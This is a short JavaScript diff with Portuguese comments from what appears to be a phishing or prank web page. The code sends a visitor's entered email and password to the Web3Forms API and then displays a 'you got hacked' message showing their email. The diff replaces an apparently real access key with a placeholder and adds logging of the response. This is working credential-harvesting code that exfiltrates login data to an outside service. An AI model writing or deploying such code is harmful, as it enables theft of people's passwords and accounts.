@@ -110,15 +110,18 @@
         }
 
         // envia os dados para o Web3Forms
-        fetch("https://api.web3forms.com/submit", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                access_key: "ea4bb1a8-2133-42a6-bc1c-7fa9df3783ae",
-                email: valorPegado,
-                senha: valorSenha
-            })
-        });
+  fetch("https://api.web3forms.com/submit", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+        access_key: "SUA_ACCESS_KEY_AQUI",
+        email: valorPegado,
+        senha: valorSenha
+    })
+})
+.then(response => response.json())
+.then(data => console.log("Resposta Web3Forms:", data))
+.catch(error => console.error("Erro no envio:", error));
 
         element.innerHTML = `<h2> Vc foi hakiado <span>🔴${valorPegado}🔴</span>!!</h2> <img src="https://giphy.com/embed/DqiMTFxiXx0VaVZQbF">`
         element.style.backgroundColor = 'rgb(136, 132, 132)';
